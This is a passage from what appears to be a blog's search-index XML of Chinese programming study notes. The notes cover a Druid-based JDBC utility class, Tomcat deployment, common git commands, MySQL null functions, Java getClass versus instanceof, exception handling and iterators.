function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>pro<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>is<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取连接池对象</span><span class="token class-name">DataSource</span> ds <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>pro<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 获取连接</span><span class="token class-name">Connection</span> conn <span class="token operator">=</span> ds<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="定义工具类"><a href="#定义工具类" class="headerlink" title="定义工具类"></a>定义工具类</h3><ol><li><p>定义一个类<code>JDBCUtils</code></p></li><li><p>提供静态代码块加载配置文件，初始化连接池对象</p></li><li><p>提供方法</p><ul><li>获取连接方法：通过数据库连接池获取连接</li><li>释放资源</li><li>获取连接池方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCUtils</span> <span class="token punctuation">&#123;</span>    <span class="token comment">//1.定义成员变量 DataSource</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">DataSource</span> ds <span class="token punctuation">;</span>    <span class="token keyword">static</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//1.加载配置文件</span>            <span class="token class-name">Properties</span> pro <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            pro<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">JDBCUtils</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getResourceAsStream</span><span class="token punctuation">(</span><span class="token string">"druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">//2.获取DataSource</span>            ds <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>pro<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 获取连接     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> ds<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 释放资源     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token class-name">Statement</span> stmt<span class="token punctuation">,</span><span class="token class-name">Connection</span> conn<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token function">close</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>stmt<span class="token punctuation">,</span>conn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token class-name">ResultSet</span> rs <span class="token punctuation">,</span> <span class="token class-name">Statement</span> stmt<span class="token punctuation">,</span> <span class="token class-name">Connection</span> conn<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>rs <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                                rs<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                  <span class="token keyword">if</span><span class="token punctuation">(</span>stmt <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                            stmt<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>conn <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//归还连接</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">SQLException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/**     * 获取连接池方法     */</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">DataSource</span> <span class="token function">getDataSource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span>  ds<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tomcat</title>
      <link href="/2022/03/06/tomcat/"/>
      <url>/2022/03/06/tomcat/</url>
      
        <content type="html"><![CDATA[<h2 id="安装中可能出现的问题"><a href="#安装中可能出现的问题" class="headerlink" title="安装中可能出现的问题"></a>安装中可能出现的问题</h2><ol><li><p><strong>黑窗口一闪而过</strong>：</p><p>检查 JAVA_HOME 环境变量是否配置正确</p></li><li><p><strong>启动报错</strong>：</p><p>可能端口被占用（默认为8080端口）</p><ul><li><p>找到占用端口的进程，kill it</p></li><li><p>修改自身的端口号：在安装目录下的conf&#x2F;server.xml中</p><p><code>&lt;Connector port=&quot;8888&quot; protocol=&quot;HTTP/1.1&quot; connectionTimeout=&quot;20000&quot; redirectPort=&quot;8445&quot; /&gt;</code></p><p>一般会将tomcat的默认端口修改为80，80是http协议的默认端口号，</p><p>​好处：在访问时，就不需要输入端口号了</p></li></ul></li></ol><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="部署项目的方式"><a href="#部署项目的方式" class="headerlink" title="部署项目的方式"></a>部署项目的方式</h3><ol><li><p>直接将项目放到<code>webapps</code>目录下即可。</p><ul><li><p>&#x2F;*** : 项目的访问目录–&gt;虚拟目录</p></li><li><p>简化部署：将项目打包成一个war包，再将war包放置到<code>webapps</code>目录下</p><p>war包会自动解压缩</p></li></ul></li><li><p>配置conf&#x2F;server.xml文件</p><p>在<code>&lt;Host&gt;</code>标签体中配置<code>&lt;Context docBase=&quot;D:\hello&quot; path=&quot;/hello&quot;&gt;</code></p><ul><li>docbase : 项目存放的路径</li><li>path : 虚拟目录</li></ul></li><li><p>在<code>conf/Catalina/localhost</code>中创建任意的xml文件，写入以下内容</p><Context docBase="D:\hello"><ul><li>虚拟目录 : xml文件的名称</li></ul></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gitStudy</title>
      <link href="/2022/01/01/gitStudy/"/>
      <url>/2022/01/01/gitStudy/</url>
      
        <content type="html"><![CDATA[<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><table><thead><tr><th>命令名称</th><th>作用</th></tr></thead><tbody><tr><td>git config –global user.name 用户名</td><td>设置用户签名</td></tr><tr><td>git config –global user.email 邮箱</td><td>设置用户签名</td></tr><tr><td>git init</td><td>初始化本地库</td></tr><tr><td>git status</td><td>查看本地库状态</td></tr><tr><td>git add 文件名</td><td>添加到暂存区</td></tr><tr><td>git commit -m “日志信息” 文件名</td><td>提交到本地库</td></tr><tr><td>git reflog</td><td>查看历史记录</td></tr><tr><td>git reset –hard 版本号</td><td>版本穿梭</td></tr><tr><td>git branch 分支名</td><td>创建分支</td></tr><tr><td>git branch -v</td><td>查看分支</td></tr><tr><td>git checkout 分支名</td><td>切换分支</td></tr><tr><td>git merge 分支名</td><td>将指定分支合并到当前分支</td></tr><tr><td>git remote -v</td><td>查看当前所有远程地址名</td></tr><tr><td>git remote add 别名 远程地址</td><td>起别名</td></tr><tr><td>git push 别名 分支</td><td>推送本地分支上的内容到远程仓库</td></tr><tr><td>git clone 远程地址</td><td>将远程仓库的内容克隆到本地</td></tr><tr><td>git pull 远程库地址别名 远程分支名</td><td>将远程仓库对于分支最新内容拉下来后与当前本地分支直接合并</td></tr><tr><td>git stash save [<message>]</td><td>储藏当前修改（不提交）</td></tr><tr><td>git stash list</td><td>查看储藏记录</td></tr><tr><td>git stash pop [–index] [-q | –quiet] [<stash>]</td><td>取出之前储藏的修改</td></tr><tr><td>git stash apply [–index] [-q | –quiet] [<stash>]</td><td>取出之前储藏的修改（不从列表中删除）</td></tr><tr><td>git stash drop [-q | –quiet] [<stash>]</td><td>将指定储藏从储藏记录列表中删除</td></tr></tbody></table><h2 id="ssh免密登陆"><a href="#ssh免密登陆" class="headerlink" title="ssh免密登陆"></a>ssh免密登陆</h2><p><code>ssh-keygen -t rsa -C 123@qq.com</code></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql中的isnull函数</title>
      <link href="/2021/10/30/mysql%E4%B8%AD%E7%9A%84isnull%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/30/mysql%E4%B8%AD%E7%9A%84isnull%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>1.<code>isnull(exper)</code> 判断exper是否为空，是则返回1，否则返回0</p><p>2.<code>ifnull(exper1,exper2)</code>判断exper1是否为空，是则用exper2代替</p><p>3.<code>nullif(exper1,exper2)</code>如果expr1&#x3D; expr2 成立，那么返回值为NULL，否则返回值为  expr1。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java中getClass()和instanceof的区别与联系</title>
      <link href="/2021/10/30/Java%E4%B8%ADgetClass-%E5%92%8Cinstanceof%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/"/>
      <url>/2021/10/30/Java%E4%B8%ADgetClass-%E5%92%8Cinstanceof%E7%9A%84%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>在比较两个类时，常见有两种做法，一种是<code>x.getClass() == y</code>; 一种是<code>x instanceof y</code>，通过下面代码来看一下二者有什么区别</p><blockquote><p><code>getClass()</code>返回一个对象所属的类</p><p><code>instanceof</code>比较一个对象是否是该类的实例</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">Fu</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Zi</span> <span class="token keyword">extends</span> <span class="token class-name">Fu</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Fu</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Zi</span> zi <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Zi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Fu</span> fu <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Fu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">// class Zi</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Fu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> fu<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// false</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj <span class="token keyword">instanceof</span> <span class="token class-name">Zi</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> zi<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"==================="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>zi <span class="token keyword">instanceof</span> <span class="token class-name">Fu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// true</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>zi<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> fu<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到，<code>getClass</code>返回的是一个类名，也就是说只会在类名相同时返回 true，不会判断子类与父类的继承关系。<code>instanceof</code>会判断继承关系，<code>子对象 instanceof 父类</code> 会返回 true，<code>父对象 instanceof 子类</code>会返回 false。</p><p><strong>即<code>instanceof</code>进行类型检查规则是：你属于该类吗？或者你属于该类的派生类吗？而通过<code>getClass()</code>获得类型信息采用<code>==</code>来进行检查是否相等的操作，是严格的判断，不会存在继承方面的考虑。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>异常</title>
      <link href="/2021/10/15/%E5%BC%82%E5%B8%B8/"/>
      <url>/2021/10/15/%E5%BC%82%E5%B8%B8/</url>
      
        <content type="html"><![CDATA[<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>异常指的是程序在执行过程中，出现的非正常的情况，最终会导致 jvm 的非正常停止</p><p>在 java 等面向对象的编程语言中，异常本身是一个类，产生异常对象并抛出了一个异常对象，java 处理异常的方式是中断处理</p><blockquote><p>异常指的并不是语法错误，语法错了，编译不通过，不会产生字节码文件，根本不能运行</p></blockquote><h3 id="异常体系"><a href="#异常体系" class="headerlink" title="异常体系"></a>异常体系</h3><p>异常机制其实是帮助我们找到程序中的问题，异常的根类是<code>java.lang.Throwable</code>，其下有两个子类：<code>java.lang.Error</code>和<code>java.lang.Exception</code>，平时所说的异常指<code>java.lang.Exception</code></p><ul><li><strong>Error</strong>：严重错误，必须修改源代码，程序才能继续执行</li><li><strong>Exception</strong>：表示异常，异常产生后程序员可以通过代码的方式纠正，使程序继续运行</li></ul><h4 id="Throwable-中的常用方法："><a href="#Throwable-中的常用方法：" class="headerlink" title="Throwable 中的常用方法："></a>Throwable 中的常用方法：</h4><ul><li><p><code>public void printStackTrace()</code>：打印异常的详细信息</p><p>包含了异常的类型，异常的原因，还包括异常出现的位置，在开发和调试阶段，都得使用<code>printStackTrace()</code></p></li><li><p><code>public String getMessage()</code>：获取发生异常的原因</p><p>提示给用户的时候，就提示错误原因</p></li><li><p><code>public String toString()</code>：获取异常的类型和异常描述信息</p></li></ul><h3 id="异常分类"><a href="#异常分类" class="headerlink" title="异常分类"></a>异常分类</h3><ul><li>编译时期异常（checked 异常）在编译时期，就会检查，如果没有处理异常，则编译失败</li><li>运行时期异常（runtime 异常）在运行时期，检查异常。在编译时期，<code>RuntimeException</code>编译器不会检测</li></ul><h3 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h3><p>五个关键字：throw，throws，try，catch，finally</p><h4 id="抛出异常-throw（必须写在方法的内部）"><a href="#抛出异常-throw（必须写在方法的内部）" class="headerlink" title="抛出异常 throw（必须写在方法的内部）"></a>抛出异常 throw（必须写在方法的内部）</h4><p>在编写程序时，我们必须要考虑程序出现问题的情况，比如，在定义方法时，方法需要接收参数。那么，当调用方法使用接收到的参数时，首先需要对参数数据进行合法的判断，数据若不合法，就应该告诉调用者，传递合法的数据进来，这时就需要使用抛出异常的方式来告诉调用者。</p><h5 id="使用格式"><a href="#使用格式" class="headerlink" title="使用格式"></a>使用格式</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">throw</span> <span class="token keyword">new</span> 异常类名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*1.创建一个异常对象，封装一些提示信息2.使用throw关键字将异常对象抛出给方法的调用者，并结束当前方法的执行*/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>如果产生了异常，我们将异常对象 throw 给方法的调用者，对于调用者来说，一种是进行捕获处理，另一种就是继续将对象使用 throws 声明抛出出去</p></blockquote><h4 id="声明异常-throws（必须写在方法声明处）"><a href="#声明异常-throws（必须写在方法声明处）" class="headerlink" title="声明异常 throws（必须写在方法声明处）"></a>声明异常 throws（必须写在方法声明处）</h4><p>声明异常：将问题标识出来，报告给调用者，如果方法内通过 throw 抛出了编译期异常，而没有进行捕获处理，那么必须通过 throws 进行声明，让调用者处理</p><h5 id="使用格式-1"><a href="#使用格式-1" class="headerlink" title="使用格式"></a>使用格式</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java">修饰符 返回值类型 方法名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span> <span class="token keyword">throws</span> 异常类名<span class="token number">1</span><span class="token punctuation">,</span>异常类名<span class="token number">2.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="捕获异常-try…catch"><a href="#捕获异常-try…catch" class="headerlink" title="捕获异常 try…catch"></a>捕获异常 try…catch</h4><p>try…catch 的方式就是捕获异常</p><h5 id="使用格式-2"><a href="#使用格式-2" class="headerlink" title="使用格式"></a>使用格式</h5><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 可能出现异常的代码</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型 e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 记录日志、打印异常信息，继续抛出异常</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="finally-代码块"><a href="#finally-代码块" class="headerlink" title="finally 代码块"></a>finally 代码块</h4><p>有一些特定的代码无论异常是否发生，都需要执行。另外，因为异常会引发程序跳转，导致有些语句执行不到，放在<code>finally</code>代码块中的代码都是一定会被执行的</p><p>例如：</p><p>​ 当我们在 try 语句块中打开了一些物理资源(磁盘文件&#x2F;网络连接&#x2F;数据库连接等),我们都得在使用完之后,最终关闭打开的资源。</p><blockquote><p>finally 不能单独使用</p></blockquote><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><p>多个异常使用捕获该如何处理</p><ol><li>多个异常分别处理</li><li>多个异常一次捕获，多次处理</li><li>多个异常一次捕获，一次处理</li></ol><p>一般采用一次捕获多次处理的方式</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span><span class="token punctuation">&#123;</span>    可能产生异常的代码<span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token class-name">A</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span><span class="token punctuation">(</span>异常类型<span class="token class-name">B</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// ...</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这种异常处理方式，要求多个 catch 中的异常不能相同，并且若 catch 中的多个异常之间有子父类关系，那么子类异常要求在上面的 catch 处理，父类异常在下面的 catch 处理</p></blockquote></li><li><p>运行时异常被抛出可以不处理，即不捕获也不声明抛出，默认交给 JVM 处理(打印异常对象,中断程序)</p></li><li><p>如果 finally 有 return 语句，会永远返回 finally 中的结果，避免这种情况</p></li><li><p>如果父类抛出了多个异常，子类重写父类方法时，抛出和父类相同的异常，或者父类异常的子类，或者不抛出异常</p></li><li><p>父类没有抛出异常，子类重写父类该方法时，也不可抛出异常。此时子类产生的异常只能捕获处理，不能声明抛出</p></li></ul><h3 id="自定义异常类"><a href="#自定义异常类" class="headerlink" title="自定义异常类"></a>自定义异常类</h3><ol><li>自定义一个编译期异常: 自定义类并继承于<code>java.lang.Exception</code>。</li><li>自定义一个运行时期的异常类:自定义类并继承于<code>java.lang.RuntimeException</code>。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>迭代器</title>
      <link href="/2021/10/11/%E8%BF%AD%E4%BB%A3%E5%99%A8/"/>
      <url>/2021/10/11/%E8%BF%AD%E4%BB%A3%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Iterator-迭代器"><a href="#Iterator-迭代器" class="headerlink" title="Iterator 迭代器"></a>Iterator 迭代器</h1><h2 id="Iterator-接口"><a href="#Iterator-接口" class="headerlink" title="Iterator 接口"></a>Iterator 接口</h2><p>在程序开发中，经常需要遍历集合中的所有元素。针对这种需求，JDK 专门提供了一个接口<br><code>java.util.Iterator</code> 。<code>Iterator</code> 接口也是 Java 集合中的一员，但它与<code>Collection</code> 、<code>Map</code> 接口有所<br>不同，<code>Collection</code> 接口与<code>Map</code> 接口主要用于存储元素，而<code>Iterator</code> 主要用于迭代访问（即遍历）<br>Collection 中的元素，因此 Iterator 对象也被称为迭代器。</p><h3 id="获取方式"><a href="#获取方式" class="headerlink" title="获取方式"></a>获取方式</h3><p>Iterator 迭代器，是一个接口，我们无法直接使用，需要使用 Iterator 接口的实现类对象，获取实现类的方式比较特殊</p><p>Collection 接口中有一个方法，<code>iterator()</code>，返回的就是迭代器的实现类对象</p><p><code>Iterator&lt;E&gt; iterator()</code> 返回在此 collection 的元素上进行迭代的迭代器对象</p><h3 id="常用方法："><a href="#常用方法：" class="headerlink" title="常用方法："></a>常用方法：</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 如果仍有元素可以迭代，返回<span class="token boolean">true</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 返回迭代的下一个元素<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="使用步骤："><a href="#使用步骤：" class="headerlink" title="使用步骤："></a>使用步骤：</h3><p>1.使用集合中的方法 iterator()获取迭代器的实现类对象,使用 Iterator 接口接收(多态)</p><p>2.使用 Iterator 接口中的方法 hasNext 判断还有没有下一个元素</p><p>3.使用 Iterator 接口中的方法 next 取出集合中的下一个元素</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IteratorTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> coll <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coll<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"AAA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coll<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"BBB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coll<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"CCC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        coll<span class="token 